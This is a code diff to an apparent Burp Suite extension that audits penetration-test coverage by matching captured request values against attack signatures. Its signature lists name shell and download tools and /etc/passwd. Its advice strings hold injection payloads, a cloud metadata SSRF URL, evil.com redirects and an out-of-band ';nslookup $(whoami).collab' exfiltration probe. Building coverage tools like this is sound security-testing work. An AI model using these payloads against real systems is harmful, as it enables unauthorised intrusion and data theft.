@@ -33,9 +33,10 @@ from datetime import datetime
 from collections import defaultdict
 
 try:
-    from urllib.parse import urlparse, parse_qs
+    from urllib.parse import urlparse, parse_qs, unquote, unquote_plus
 except ImportError:
     from urlparse import urlparse, parse_qs
+    from urllib import unquote, unquote_plus
 
 try:
     from burp import IBurpExtender, ITab
@@ -62,6 +63,40 @@ except (OverflowError, AttributeError):
         csv.field_size_limit(2 ** 31 - 1)
     except Exception:
         pass
+
+
+def _u(v):
+    """Coerce any value to a text (unicode) string WITHOUT the ascii-encode
+    crash Jython 2.7 throws on str(u'non-ascii').
+
+    Burp's default CSV base64-encodes the Request column; decoding it yields
+    unicode, so parameter values are unicode. Calling Py2 str() on a unicode
+    value with non-ASCII bytes raises UnicodeEncodeError. This helper is used
+    everywhere a value/parameter-name is turned into a string for matching,
+    formatting or comparison. Bytes are UTF-8 decoded (replace on error)."""
+    if v is None:
+        return u''
+    if isinstance(v, bytes):            # Py2: str is bytes; Py3: real bytes
+        try:
+            return v.decode('utf-8', 'replace')
+        except Exception:
+            try:
+                return v.decode('latin-1', 'replace')
+            except Exception:
+                return u''
+    try:
+        return unicode(v)               # Py2/Jython text type
+    except NameError:
+        return str(v)                   # Py3
+
+
+def _join_clean(items, sep=', ', limit=None):
+    """Readable comma list of values/param-names for report 'Evidence' fields -
+    avoids the ugly Python repr (`[u'x', u'y']`) and is unicode-safe."""
+    seq = list(items)
+    if limit is not None:
+        seq = seq[:limit]
+    return sep.join(_u(x) for x in seq)
 
 
 # ============================================================
@@ -233,25 +268,37 @@ FRAMEWORK_PARAMS = set([
 ])
 
 PARAM_ATTACK_MATRIX = [
-    ('SQLi',         ("'", '"', '--', ';', '/*', 'or 1=1', 'union', 'sleep', 'waitfor'),
+    ('SQLi',         ("'", '"', '--', '/*', '*/', '#', 'or 1=1', 'or 1=2', 'and 1=1', 'and 1=2',
+                      "' or '", "' and '", '" or "', '" and "', 'union select', 'union all',
+                      'order by', 'group by', 'having ', 'sleep(', 'pg_sleep', 'benchmark(',
+                      'waitfor delay', 'dbms_pipe', 'extractvalue(', 'updatexml(',
+                      'information_schema', '@@version', '0x', "')", '")', '||', 'rlike', 'regexp '),
      "' OR '1'='1'-- - | 1' AND SLEEP(5)-- - | ' UNION SELECT NULL-- - | error: ' \" )"),
-    ('NoSQL',        ('{$', '[$', '$ne', '$gt', '$regex', '.find('),
+    ('NoSQL',        ('{$', '[$', '$ne', '$gt', '$lt', '$gte', '$lte', '$regex', '$where', '$in', '.find(', '||1==1'),
      '{"$ne":null} | [$gt]= | param[$regex]=.*'),
-    ('XSS',          ('<script', 'onerror', 'onload', 'javascript:', '<img', '<svg', 'alert('),
+    ('XSS',          ('<script', '</script', 'onerror', 'onload', 'onmouseover', 'onfocus', 'onclick',
+                      'javascript:', '<img', '<svg', '<iframe', '<body', '<details', 'alert(',
+                      'prompt(', 'confirm(', 'document.cookie', 'eval(', '<%2fscript'),
      '"><svg onload=alert(1)> | \' autofocus onfocus=alert(1) | stored: submit then view render'),
-    ('SSTI',         ('{{', '${', '#{', '<%=', '{%'),
+    ('SSTI',         ('{{', '${', '#{', '<%=', '{%', '{{7*7}}', '${7*7}', '#{7*7}', '*{', '@{'),
      '${7*7} {{7*7}} #{7*7} <%=7*7%> -> 49 = template RCE'),
-    ('CmdInj',       (';id', '|id', '&&', '$(', '`id`', '%0a', 'sleep '),
+    ('CmdInj',       (';id', '|id', '| id', '&&', '||', '$(', '`', '`id`', '%0a', '%0d', 'sleep ',
+                      ';sleep', '|sleep', '& ', '&whoami', ';whoami', 'nslookup', 'ping -', 'ping%20',
+                      'curl ', 'wget ', '$(id)', 'cat /etc', 'powershell', 'cmd /c', '/bin/sh', '/bin/bash'),
      ';id | $(id) | %0aid | blind ;sleep 5 | OOB ;nslookup $(whoami).collab'),
-    ('Traversal/LFI', ('../', '..\\', '%2e%2e', '/etc/passwd', 'win.ini', 'php://'),
+    ('Traversal/LFI', ('../', '..\\', '%2e%2e', '..%2f', '..%5c', '....//', '....\\\\', '/etc/passwd',
+                       'win.ini', 'boot.ini', 'php://', 'file://', '%00', '/proc/self', 'c:\\windows'),
      '../../../../etc/passwd | ..\\..\\win.ini | %252e | ....// | %00 | php://filter'),
-    ('SSRF',         ('169.254', '127.0.0.1', 'localhost', '0.0.0.0', 'file://', 'gopher://', 'collab'),
+    ('SSRF',         ('169.254', '127.0.0.1', 'localhost', '0.0.0.0', '[::1]', '0x7f', '2130706433',
+                      'file://', 'gopher://', 'dict://', 'collab', 'interactsh', 'metadata', 'burpcollaborator',
+                      'oastify', '@127.0.0.1', '@localhost'),
      'http://169.254.169.254/latest/meta-data/ | http://localhost/ | file:// | gopher:// | Collaborator'),
-    ('OpenRedirect', ('http://', 'https://', '//evil', '\\\\'),
+    ('OpenRedirect', ('http://', 'https://', '//evil', '/\\', '\\\\', '%2f%2f', '%5c%5c', '@evil', 'https:%2f%2f'),
      '//evil.com | https://trusted@evil.com | /\\evil.com | https:evil.com'),
-    ('CRLF/Header',  ('%0d', '%0a', '\r', '\n'),
+    ('CRLF/Header',  ('%0d', '%0a', '\r', '\n', '%0d%0a', '\r\n', 'set-cookie:', 'content-length:', '%23%0a'),
      '%0d%0aSet-Cookie:x=1 | %0d%0aLocation:https://evil'),
-    ('Overflow/Type', ('-1', '99999', '0x', 'true', 'false', 'null', '[]', '{}'),
+    ('Overflow/Type', ('-1', '99999', '0x', 'true', 'false', 'null', '[]', '{}', '1e308', '2147483648',
+                       '9999999999', "'a'*", 'aaaaaaaaaa'),
      'negative / 0 / huge int / array / object / true|false|null / oversized string'),
 ]
 
@@ -303,6 +350,10 @@ class EndpointProfile(object):
         self.hpp_params = set()          # params sent with >1 value in a SINGLE request (HPP/array)
         self.array_params = set()        # params whose name uses [] array notation
         self.empty_value_params = set()  # params observed with an empty ('') value
+        # ── Burp tool provenance (from the CSV 'Tool' column) ──
+        self.tools_seen = set()          # e.g. {'Proxy','Scanner','Repeater','Intruder'}
+        self.scanner_hits = 0            # requests issued by Burp Scanner (active audit)
+        self.intruder_hits = 0           # requests issued by Burp Intruder (fuzzing)
 
 
 class EndpointAudit(object):
@@ -424,6 +475,7 @@ def _from_json(e):
                 'raw_request': _raw_request_from_loggerpp(req),
                 'status':      int(resp.get('Status') or 0),
                 'resp_len':    int(resp.get('BodyLength') or resp.get('Length') or 0),
+                'tool':        req.get('Tool') or e.get('Tool') or '',
             }
 
         url = e.get('url') or e.get('URL') or e.get('path', '')
@@ -436,6 +488,7 @@ def _from_json(e):
             'raw_request': e.get('request') or e.get('Request') or '',
             'status':      int(e.get('responseStatus') or e.get('status') or e.get('Status') or 0),
             'resp_len':    int(e.get('responseBodyLength') or e.get('responseLength') or e.get('length') or 0),
+            'tool':        e.get('tool') or e.get('Tool') or '',
         }
     except Exception:
         return None
@@ -472,6 +525,9 @@ def _from_csv(row):
             'raw_request': raw_req,
             'status':      int(row.get('Status code') or row.get('Status') or row.get('ResponseStatus') or row.get('status') or 0),
             'resp_len':    int(row.get('ResponseBodyLength') or row.get('Length') or row.get('length') or 0),
+            # Burp default CSV has a 'Tool' column (Proxy/Scanner/Intruder/Repeater/...).
+            # This is definitive evidence of HOW an endpoint was tested.
+            'tool':        row.get('Tool') or row.get('tool') or '',
         }
     except Exception:
         return None
@@ -520,7 +576,7 @@ def _parse_body_params(raw, ct):
             if isinstance(parsed, dict):
                 out = {}
                 for k, v in parsed.items():
-                    out[k] = [str(v)]
+                    out[k] = [_u(v)]
                 return out
         except Exception:
             pass
@@ -562,12 +618,12 @@ def _is_payload_fragment_param(name, values):
     payload (split out of a value by & / ; / whitespace), not a real app input.
     Filtering these removes the false positives a pentester sees after running
     an injection scan and then re-running CoverMap on the captured traffic."""
-    n = str(name)
+    n = _u(name)
     if _JUNK_PARAM_NAME.search(n):          # whitespace / shell metachars / quotes / backslash
         return True
     nl = n.strip().lower()
     if nl in _CMD_WORD_PARAMS:
-        if all((v is None or str(v).strip() == '') for v in values):
+        if all((v is None or _u(v).strip() == '') for v in values):
             return True
     for frag in _INJECTION_NAME_FRAGMENT:
         if frag in nl:
@@ -618,6 +674,15 @@ def build_profiles(requests):
         p.status_codes_seen.add(req['status'])
         p.response_lengths.append(req['resp_len'])
 
+        tool = (req.get('tool') or '').strip()
+        if tool:
+            p.tools_seen.add(tool)
+        tl = tool.lower()
+        if 'scanner' in tl:
+            p.scanner_hits += 1
+        elif 'intruder' in tl:
+            p.intruder_hits += 1
+
         # Per-request structural bookkeeping (presence, HPP, array, empty).
         if bparams:
             p.body_submit_count += 1
@@ -626,9 +691,9 @@ def build_profiles(requests):
             p.body_param_presence[param] = p.body_param_presence.get(param, 0) + 1
             if len(vals) > 1:                       # same key sent twice in ONE request -> HPP/array
                 p.hpp_params.add(param)
-            if '[]' in str(param):
+            if '[]' in _u(param):
                 p.array_params.add(param)
-            if any((v is None or str(v) == '') for v in vals):
+            if any((v is None or _u(v) == '') for v in vals):
                 p.empty_value_params.add(param)
 
         if qparams:
@@ -638,9 +703,9 @@ def build_profiles(requests):
             p.query_param_presence[param] = p.query_param_presence.get(param, 0) + 1
             if len(vals) > 1:
                 p.hpp_params.add(param)
-            if '[]' in str(param):
+            if '[]' in _u(param):
                 p.array_params.add(param)
-            if any((v is None or str(v) == '') for v in vals):
+            if any((v is None or _u(v) == '') for v in vals):
                 p.empty_value_params.add(param)
 
         any_auth = False
@@ -694,10 +759,10 @@ def _has_attack_evidence(p):
         return True
     for d in (p.query_params, p.body_params):
         for k, vals in d.items():
-            if str(k).strip().lower() in FRAMEWORK_PARAMS:
+            if _u(k).strip().lower() in FRAMEWORK_PARAMS:
                 continue
             for v in vals:
-                lv = str(v).lower()
+                lv = _u(v).lower()
                 for s in ATTACK_VALUE_SIGS:
                     if s in lv:
                         return True
@@ -705,6 +770,11 @@ def _has_attack_evidence(p):
 
 
 def _classify(p):
+    # Burp Scanner / heavy Intruder => automated active testing (Intruder-class).
+    if p.scanner_hits >= 20 or p.intruder_hits >= 50:
+        return 'intruder'
+    if p.scanner_hits >= 1 or p.intruder_hits >= 5:
+        return 'repeater'
     if p.total_requests == 1:
         # Even a single request can be an active test if it carries a payload.
         return 'repeater' if _has_attack_evidence(p) else 'single'
@@ -750,7 +820,7 @@ def _norm_param(name):
     wrapper words like 'Content' or 'Master' were matching real
     keywords like 'content' (file-upload) or 'master' (admin).
     """
-    s = re.sub(r'[$_.\-\[\]]+', ' ', str(name))
+    s = re.sub(r'[$_.\-\[\]]+', ' ', _u(name))
     tokens = s.split()
     cleaned = []
     for t in tokens:
@@ -782,8 +852,8 @@ def _response_flip_targets(p, fn):
     parameter names - so the recommendation names actual likely fields, not generic
     'flip success:false to true' boilerplate."""
     targets = []
-    all_param_names = set(str(k).lower() for k in p.query_params)
-    all_param_names |= set(str(k).lower() for k in p.body_params)
+    all_param_names = set(_u(k).lower() for k in p.query_params)
+    all_param_names |= set(_u(k).lower() for k in p.body_params)
     path_l = p.path.lower()
 
     # Auth-class endpoints (login, oauth, sso, token)
@@ -879,8 +949,35 @@ def _response_flip_targets(p, fn):
     return targets
 
 
+def _decode_variants(v):
+    """Return the lowercased value plus URL-decoded variants (up to two passes,
+    both %20 and + styles) so encoded/double-encoded payloads still match the
+    attack signatures. `%27%20OR%201=1` -> `' or 1=1`; `%2575nion` -> `union`."""
+    out = []
+    s = _u(v)
+    out.append(s.lower())
+    cur = s
+    for _ in range(2):
+        try:
+            dec = unquote_plus(cur)
+        except Exception:
+            try:
+                dec = unquote(cur)
+            except Exception:
+                break
+        if dec == cur:
+            break
+        cur = dec
+        out.append(cur.lower())
+    return out
+
+
 def _has_sig(values, sigs):
-    low = [str(v).lower() for v in values]
+    """True if any tested value (raw OR URL-decoded) contains an attack
+    signature. Decoding is what lets encoded WAF-bypass payloads still count."""
+    low = []
+    for v in values:
+        low.extend(_decode_variants(v))
     for s in sigs:
         for v in low:
             if s in v:
@@ -904,9 +1001,11 @@ _PRIV_KEY_RE    = re.compile(
     r'\b(is_?admin|admin|role|roles|verified|approved|active|enabled|'
     r'balance|credit|permission|grant|tier|plan|status|account_?type|user_?type|level)\b', re.I)
 
-SQLI_AUTH_SIGS = ("'", '"', '--', '/*', 'or 1=1', "or '1'='1", 'union select', 'sleep(', 'waitfor delay', 'admin\'--')
-NOSQL_AUTH_SIGS = ('$ne', '$gt', '$lt', '$regex', '"$ne"', '[$ne]', '[$gt]')
-LDAP_AUTH_SIGS = ('*)(', '*)', '|(uid=', '|(cn=', 'admin)(&', '&(uid=')
+SQLI_AUTH_SIGS = ("'", '"', '--', '/*', '#', 'or 1=1', 'or 1=2', 'and 1=1', "or '1'='1",
+                  "' or '", "' and '", '" or "', 'union select', 'union all', 'sleep(',
+                  'pg_sleep', 'benchmark(', 'waitfor delay', "admin'--", "admin'#", "')", '" or 1')
+NOSQL_AUTH_SIGS = ('$ne', '$gt', '$lt', '$gte', '$regex', '$where', '$in', '"$ne"', '[$ne]', '[$gt]', '||1==1')
+LDAP_AUTH_SIGS = ('*)(', '*)', '|(uid=', '|(cn=', 'admin)(&', '&(uid=', ')(|(', '*))%00', '*)(uid=*')
 
 STRUCT_EMPTY = ('',)
 STRUCT_NULL = ('null', 'none', '"null"', "'null'")
@@ -918,11 +1017,11 @@ def _values_for(all_params, name_regex):
     """Collect every tested value for params whose normalised name matches name_regex."""
     out = []
     for k, vals in all_params.items():
-        if str(k).strip().lower() in FRAMEWORK_PARAMS:
+        if _u(k).strip().lower() in FRAMEWORK_PARAMS:
             continue
         if name_regex.search(_norm_param(k)):
             out.extend(list(vals))
-    return [str(v).lower() for v in out]
+    return [_u(v).lower() for v in out]
 
 
 def _detect_removed_params(p):
@@ -936,13 +1035,13 @@ def _detect_removed_params(p):
     removed = set()
     if p.body_submit_count >= 2:
         for param, cnt in p.body_param_presence.items():
-            if str(param).strip().lower() in FRAMEWORK_PARAMS:
+            if _u(param).strip().lower() in FRAMEWORK_PARAMS:
                 continue
             if cnt < p.body_submit_count:
                 removed.add(param)
     if p.query_bearing_count >= 2:
         for param, cnt in p.query_param_presence.items():
-            if str(param).strip().lower() in FRAMEWORK_PARAMS:
+            if _u(param).strip().lower() in FRAMEWORK_PARAMS:
                 continue
             if cnt < p.query_bearing_count:
                 removed.add(param)
@@ -956,7 +1055,7 @@ def _structural_signals(p, name_regex=None):
     sig = set()
     def _match(k):
         if name_regex is None:
-            return str(k).strip().lower() not in FRAMEWORK_PARAMS
+            return _u(k).strip().lower() not in FRAMEWORK_PARAMS
         return bool(name_regex.search(_norm_param(k)))
 
     removed = _detect_removed_params(p)
@@ -983,9 +1082,9 @@ def _detect_auth_testing(p, all_params):
     if not combined:
         # No obvious named fields - fall back to all non-framework param values
         for k, vals in all_params.items():
-            if str(k).strip().lower() in FRAMEWORK_PARAMS:
+            if _u(k).strip().lower() in FRAMEWORK_PARAMS:
                 continue
-            combined.extend(str(v).lower() for v in vals)
+            combined.extend(_u(v).lower() for v in vals)
 
     if any(s in v for s in SQLI_AUTH_SIGS for v in combined):
         tested.add('sqli')
@@ -1005,7 +1104,7 @@ def _detect_auth_testing(p, all_params):
         tested.add('brute_volume')
     # Per-field fuzzing signal: 4+ distinct values on any candidate field
     for k, vals in all_params.items():
-        if str(k).strip().lower() in FRAMEWORK_PARAMS:
+        if _u(k).strip().lower() in FRAMEWORK_PARAMS:
             continue
         nm = _norm_param(k)
         if (_LOGIN_FIELD_RE.search(nm) or _PWD_FIELD_RE.search(nm) or
@@ -1033,7 +1132,7 @@ def _detect_auth_testing(p, all_params):
 def _detect_mass_assign_tested(p):
     """Did the user inject privilege/state keys into the body?"""
     for k in p.body_params:
-        if str(k).strip().lower() in FRAMEWORK_PARAMS:
+        if _u(k).strip().lower() in FRAMEWORK_PARAMS:
             continue
         if _PRIV_KEY_RE.search(_norm_param(k)):
             return True
@@ -1058,6 +1157,45 @@ def _detect_cors_tested(p):
     return 'origin' in p.headers_modified
 
 
+# Burp Scanner audits an endpoint with dozens-to-hundreds of requests across all
+# active-audit issue types. A handful of Scanner requests against an endpoint is
+# definitive evidence it was actively audited. Intruder needs a higher bar since
+# its payload set is whatever the user loaded.
+SCANNER_AUDIT_MIN = 5
+INTRUDER_AUDIT_MIN = 20
+
+# Attack classes Burp Scanner's active audit genuinely covers - credited when an
+# endpoint was scanner-audited. Manual/logic classes (auth bypass, business
+# logic, mass assignment, response tampering) are deliberately NOT in this set.
+SCANNER_COVERED_CLASSES = set([
+    'SQLi', 'NoSQL', 'XSS', 'SSTI', 'CmdInj', 'Traversal/LFI',
+    'SSRF', 'OpenRedirect', 'CRLF/Header',
+])
+
+
+def _scanner_audited(p):
+    """True if Burp Scanner (or heavy Intruder fuzzing) actively audited this
+    endpoint. Used to credit the automated injection classes so a full Burp
+    scan is recognised instead of being reported as 'not tested'."""
+    return p.scanner_hits >= SCANNER_AUDIT_MIN or p.intruder_hits >= INTRUDER_AUDIT_MIN
+
+
+def _is_nonexistent_endpoint(p):
+    """True if the endpoint never returned real content - only 404s (and/or 0 =
+    no/failed response). These are crawler/scanner probes for paths that don't
+    exist on this app (e.g. /api/graphql or /actuator on an ASP.NET/.aspx or PHP
+    site). Treating them as real endpoints produces a flood of false-positive
+    'not tested' gaps, so they are dropped before analysis.
+
+    Conservative by design: an endpoint is dropped ONLY when 404 is observed AND
+    no non-404, non-zero status ever was. So `/api/users/{id}` that returned 200
+    once and 404 once is KEPT; a path that only ever 404'd is dropped. 401/403
+    (protected-but-real) and 3xx (redirects) are never treated as non-existent."""
+    statuses = set(s for s in p.status_codes_seen if isinstance(s, int))
+    real = statuses - set([0, 404])
+    return (404 in statuses) and (len(real) == 0)
+
+
 def _heuristics(p):
     gaps = []
     credits = [0]   # count of test-classes proven exercised (drives the score up on retest)
@@ -1076,6 +1214,11 @@ def _heuristics(p):
     # reachable anonymously. We still run the brute-force, auth-bypass payload,
     # structural-tampering, reset-flow, OTP, and response-flip checks below.
     is_prelogin = bool(fn & set(['auth', 'reset', 'register', 'otp']))
+
+    # Did Burp Scanner / heavy Intruder actively audit this endpoint? If so, the
+    # automated injection classes are credited even when individual payloads are
+    # not captured in the export, so a full scan isn't reported as 'not tested'.
+    scanner_audited = _scanner_audited(p)
 
     def g(cat, sev, title, detail, evidence, rec, owasp='', kind='test'):
         gaps.append(Gap(ep, cat, sev, title, detail, evidence, rec, owasp, kind))
@@ -1132,17 +1275,17 @@ def _heuristics(p):
         g('crypto', 'MEDIUM',
           'Sensitive value(s) in URL query: {0}'.format(", ".join(leaky)),
           'Secrets in the query string leak via logs, Referer, proxy and browser history.',
-          'query params: {0}'.format(leaky),
+          'query params: {0}'.format(_join_clean(leaky)),
           'Move to POST body/headers. Check server access logs, Referer leakage to 3rd parties, caching.',
           'A02:2021 Cryptographic Failures')
 
     # A03: INJECTION + per-param coverage
     removed_params = _detect_removed_params(p)   # computed once for the whole endpoint
     for param, values in all_params.items():
-        if str(param).strip().lower() in FRAMEWORK_PARAMS:
+        if _u(param).strip().lower() in FRAMEWORK_PARAMS:
             continue
         vals = list(values)
-        ev = "{0}={1}".format(param, vals[:3])
+        ev = "{0}={1}".format(_u(param), _join_clean(vals, limit=3))
         np = _norm_param(param)
         # Per-param structural evidence (field removal / empty / HPP / array).
         param_struct = set()
@@ -1155,7 +1298,7 @@ def _heuristics(p):
         if param in p.array_params:
             param_struct.add('array')
 
-        if INJECTION_PARAM.search(np) or IDOR_PARAM.search(np):
+        if (INJECTION_PARAM.search(np) or IDOR_PARAM.search(np)) and not scanner_audited:
             if not _has_sig(values, ("'", '"', '--', ';', '/*', 'or 1=1', 'union', 'sleep', 'waitfor', '`')):
                 g('injection', 'HIGH', 'SQLi not tested on `{0}`'.format(param),
                   '`{0}` flows into a query. No SQLi payloads observed.'.format(param), ev,
@@ -1163,7 +1306,7 @@ def _heuristics(p):
                   "`1);WAITFOR DELAY '0:0:5'--` ; UNION: `' UNION SELECT NULL-- -` ; stacked. " + WAF_BYPASS,
                   'A03:2021 Injection')
 
-        if XSS_PARAM.search(np) and not _has_sig(values, ('<script', 'onerror', 'onload', 'javascript:', '<img', '<svg', 'alert(')):
+        if XSS_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('<script', 'onerror', 'onload', 'javascript:', '<img', '<svg', 'alert(')):
             g('injection', 'HIGH', 'XSS not tested on `{0}`'.format(param),
               '`{0}` is reflected/stored candidate.'.format(param), ev,
               "Reflected: `\"><svg onload=alert(1)>` ; attribute break `\" autofocus onfocus=alert(1) x=\"` ; "
@@ -1171,42 +1314,46 @@ def _heuristics(p):
               "polyglot `jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//`. Check CSP.",
               'A03:2021 Injection')
 
-        if CMD_PARAM.search(np) and not _has_sig(values, (';', '|', '&&', '`', '$(', '%0a', 'sleep ', 'ping ')):
+        if CMD_PARAM.search(np) and not scanner_audited and not _has_sig(values, (';', '|', '&&', '`', '$(', '%0a', 'sleep ', 'ping ')):
             g('injection', 'HIGH', 'OS command injection not tested on `{0}`'.format(param),
               '`{0}` name suggests a system/host/exec sink.'.format(param), ev,
               "Test `;id`, `| id`, `&& id`, `$(id)`, `` `id` ``, `%0aid`, blind: `;sleep 5`, "
               "OOB: `;nslookup $(whoami).collab`. Windows: `&whoami`, `|dir`.",
               'A03:2021 Injection')
 
-        if SSTI_PARAM.search(np) and not _has_sig(values, ('{{', '${', '#{', '<%=', '{%')):
+        if SSTI_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('{{', '${', '#{', '<%=', '{%')):
             g('injection', 'HIGH', 'SSTI not tested on `{0}`'.format(param),
               '`{0}` may be rendered by a template engine.'.format(param), ev,
               "Probe `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`, `${{7*7}}`, `{{7*'7'}}`. "
               "If 49/7777777 -> engine-specific RCE (Jinja2/Twig/Freemarker/Velocity).",
               'A03:2021 Injection')
 
-        if LDAP_PARAM.search(np) and not _has_sig(values, ('*)(', '*)', '|(', '&(')):
+        if LDAP_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('*)(', '*)', '|(', '&(')):
             g('injection', 'MEDIUM', 'LDAP / XPath injection not tested on `{0}`'.format(param),
               '`{0}` may build an LDAP/XPath filter.'.format(param), ev,
               "LDAP: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)` ; XPath: `' or '1'='1`, `'] | //user/*['`.",
               'A03:2021 Injection')
 
-        if CRLF_PARAM.search(np) and not _has_sig(values, ('%0d', '%0a', '\r', '\n')):
+        if CRLF_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('%0d', '%0a', '\r', '\n')):
             g('injection', 'MEDIUM', 'CRLF / header injection not tested on `{0}`'.format(param),
               '`{0}` may reflect into a response header.'.format(param), ev,
               "Test `%0d%0aSet-Cookie:x=1`, `%0d%0aLocation:https://evil`, response-splitting -> XSS/cache.",
               'A03:2021 Injection')
 
         # A class counts as exercised if its payload signature appears in a
-        # tested value OR (for Overflow/Type) structural evidence exists for
-        # this param (removal / empty / HPP / array). This is what lets a
-        # structural retest reduce the per-parameter gap on the next run.
+        # tested value, OR (Overflow/Type) structural evidence exists for this
+        # param, OR Burp Scanner actively audited this endpoint and the class is
+        # one the scanner covers. This is what makes a full Burp scan register as
+        # coverage instead of false "not tested" gaps.
         untested = []
         for (cls, sigs, pl) in PARAM_ATTACK_MATRIX:
             if _has_sig(values, sigs):
                 credit()
                 continue
             if cls == 'Overflow/Type' and param_struct:
+                credit()
+                continue
+            if scanner_audited and cls in SCANNER_COVERED_CLASSES:
                 credit()
                 continue
             untested.append((cls, pl))
@@ -1227,7 +1374,7 @@ def _heuristics(p):
     # ViewState / XXE / deserialization
     has_viewstate = False
     for k in p.body_params:
-        if 'viewstate' in str(k).lower():
+        if 'viewstate' in _u(k).lower():
             has_viewstate = True
             break
     if has_viewstate:
@@ -1248,14 +1395,14 @@ def _heuristics(p):
             g('integrity', 'HIGH', 'Mass assignment / parameter pollution not tested',
               'Write endpoint may bind unexpected fields (privilege/balance/state). '
               '(Heuristic: no privilege keys (role/is_admin/verified/balance/etc.) observed in submitted body.)',
-              'body params: {0}'.format(list(p.body_params)[:8]),
+              'body params: {0}'.format(_join_clean(p.body_params, limit=8)),
               'Add `role=admin`, `is_admin=true`, `verified=true`, `balance=999999`, `id=<other>` to the body. '
               'Try JSON & form; duplicate keys (HPP); array/object wrapping `user[role]=admin`.',
               'A08:2021 Software & Data Integrity Failures')
         else:
             credit()
 
-    if 'api' in fn or 'graphql' not in fn:
+    if ('api' in fn or 'graphql' not in fn) and not scanner_audited:
         g('injection', 'LOW', 'Content-type / body-format confusion not tested',
           'Endpoint may accept JSON/XML even if only form-encoded was used (or vice-versa).',
           'tested content-types only as captured',
@@ -1268,14 +1415,14 @@ def _heuristics(p):
     if money:
         g('logic', 'HIGH', 'Price/quantity tampering not tested: {0}'.format(", ".join(money[:5])),
           'Client-supplied financial fields enable under/over-charge & negative-balance abuse.',
-          'params: {0}'.format(money[:5]),
+          'params: {0}'.format(_join_clean(money, limit=5)),
           'Set negatives (qty=-1, amount=-100), 0, decimals (0.001), huge ints, currency swap, coupon stacking, '
           'and re-use one-time vouchers. Verify server recomputes server-side.',
           'A04:2021 Insecure Design')
         g('logic', 'HIGH', 'Structural tampering on price/quantity NOT tested: {0}'.format(", ".join(money[:5])),
           'Removing the price field entirely, sending empty/null, array-bound values and race-conditions '
           'on coupon/refund are distinct from value-range fuzzing and frequently bypass server validation.',
-          'params: {0}'.format(money[:5]),
+          'params: {0}'.format(_join_clean(money, limit=5)),
           STRUCTURAL_PRICE,
           'A04:2021 Insecure Design')
 
@@ -1359,7 +1506,7 @@ def _heuristics(p):
               'Param-removal / empty-value / null / type-confusion / array-bind cases on login fields - '
               'classic auth-bypass primitives that injection-payload fuzzing misses. '
               '(Heuristic: no field-removal, empty, null, bool or array/duplicate-key observed on login fields.)',
-              'params: {0}'.format(list(all_params)[:8]),
+              'params: {0}'.format(_join_clean(all_params, limit=8)),
               STRUCTURAL_LOGIN,
               'A07:2021 Identification & Authentication Failures')
         else:
@@ -1370,7 +1517,7 @@ def _heuristics(p):
             g('auth', 'CRITICAL', 'Password-reset weaknesses not tested',
               'Reset flow - token strength, host-header poisoning, and user-enum not proven. '
               '(Heuristic: <20 reqs and no per-field fuzzing of token/email observed.)',
-              'params: {0}'.format(list(all_params)[:6]),
+              'params: {0}'.format(_join_clean(all_params, limit=6)),
               'Check token entropy/expiry/single-use; Host/X-Forwarded-Host poisoning to steal reset link; '
               'user-enumeration via response/timing; reset for victim then read token; param pollution on email.',
               'A07:2021 Identification & Authentication Failures')
@@ -1380,7 +1527,7 @@ def _heuristics(p):
             g('auth', 'CRITICAL', 'Structural parameter tampering on reset NOT tested',
               'Removing or emptying token/email/code may let the reset proceed without proof of identity. '
               '(Heuristic: no field-removal, empty, null or array value observed in reset fields.)',
-              'params: {0}'.format(list(all_params)[:8]),
+              'params: {0}'.format(_join_clean(all_params, limit=8)),
               STRUCTURAL_RESET,
               'A07:2021 Identification & Authentication Failures')
         else:
@@ -1392,7 +1539,7 @@ def _heuristics(p):
             g('auth', 'HIGH', 'Registration abuse not tested',
               'Signup - role mass-assignment, email-verification bypass, duplicate/overwrite not tested. '
               '(Heuristic: no privilege keys (role/is_admin/verified/etc.) observed in submitted body.)',
-              'params: {0}'.format(list(all_params)[:8]),
+              'params: {0}'.format(_join_clean(all_params, limit=8)),
               'Inject role/is_admin during signup; register existing email (account takeover/overwrite); '
               'skip email verification; homoglyph/`+`/dot email tricks; mass-create (no captcha/rate-limit).',
               'A01:2021 Broken Access Control')
@@ -1403,7 +1550,7 @@ def _heuristics(p):
               'Empty / missing / array-bound fields plus injected privilege keys give privilege escalation '
               'at signup time on backends that bind blindly. '
               '(Heuristic: no field-removal, empty, null, array value or privilege keys observed.)',
-              'params: {0}'.format(list(all_params)[:8]),
+              'params: {0}'.format(_join_clean(all_params, limit=8)),
               STRUCTURAL_REGISTER,
               'A08:2021 Software & Data Integrity Failures')
         else:
@@ -1425,7 +1572,7 @@ def _heuristics(p):
               'Removing/blanking/null-typing the code param is one of the most common 2FA-bypass primitives. '
               'Replay and race round it out. '
               '(Heuristic: no field-removal, empty, null, bool or array value observed in OTP fields.)',
-              'params: {0}'.format(list(all_params)[:6]),
+              'params: {0}'.format(_join_clean(all_params, limit=6)),
               STRUCTURAL_OTP,
               'A07:2021 Identification & Authentication Failures')
         else:
@@ -1446,7 +1593,7 @@ def _heuristics(p):
     tokens_lower = ' '.join(t.lower() for t in p.auth_tokens_seen)
     has_jwt_param = False
     for k in all_params:
-        if 'jwt' in str(k).lower():
+        if 'jwt' in _u(k).lower():
             has_jwt_param = True
             break
     if 'bearer ' in tokens_lower or has_jwt_param:
@@ -1459,25 +1606,25 @@ def _heuristics(p):
 
     # A10 + SSRF / Open redirect / Traversal / Upload / GraphQL
     for param, values in all_params.items():
-        if str(param).strip().lower() in FRAMEWORK_PARAMS:
+        if _u(param).strip().lower() in FRAMEWORK_PARAMS:
             continue
         vals = list(values)
-        ev = "{0}={1}".format(param, vals[:3])
+        ev = "{0}={1}".format(_u(param), _join_clean(vals, limit=3))
         np = _norm_param(param)
-        if SSRF_PARAM.search(np) and not _has_sig(values, ('169.254', '127.0.0.1', 'localhost', '0.0.0.0', 'collab', 'interactsh', 'metadata')):
+        if SSRF_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('169.254', '127.0.0.1', 'localhost', '0.0.0.0', 'collab', 'interactsh', 'metadata')):
             g('ssrf', 'HIGH', 'SSRF not tested on `{0}`'.format(param),
               '`{0}` accepts URL/host input.'.format(param), ev,
